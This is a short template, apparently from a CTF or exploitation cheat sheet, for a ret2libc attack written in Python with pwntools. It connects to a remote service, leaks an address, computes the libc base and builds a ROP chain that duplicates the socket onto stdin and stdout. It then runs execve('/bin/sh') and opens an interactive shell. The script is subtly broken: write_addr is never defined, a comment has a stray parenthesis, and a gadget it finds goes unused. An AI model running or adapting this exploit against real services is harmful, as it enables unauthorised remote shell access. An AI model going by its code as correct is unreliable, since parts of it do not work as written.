# RET2LIBC Example

```python
from pwn import *
from hexdump import hexdump

#
# /!\ Specify the context
#
context.clear(arch = 'amd64')

s = remote(HOST, PORT) # work also with local process: process()
s.send(b'content')
data = s.recv(16)

rip = struct.unpack('<Q', data[0:8]) # Read unsigned long long, little endian
# Other formats: https://docs.python.org/3/library/struct.html#format-characters

libc = ELF('/path/to/libc')

# <Address in memory of libc> = <address of a function> - <address shift of the function in libc> 
# $ cat /proc/self/maps
base_libc = write_addr - libc.symbols['write']

# Set base address of libc, useful to get correct value
libc.address = base_libc

# Example of simple ROP
rop = ROP(libc)
rop.dup2(4, 0)
rop.dup2(4, 1)
bin_sh = next(libc.search(b'/bin/sh\x00'))
rop.execve(bin_sh, 0, 0)

# Shorter version: shellcraft.amd64.dupsh(4), arch="amd64")
# https://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.dupsh
gadget_pop = rop.find_gadget(['pop rdi', 'ret'])


ROP_EXECVE = rop.chain()

s.send(ROP_EXECVE)

# Transform into interactive shell
s.interactive()
```

    
    
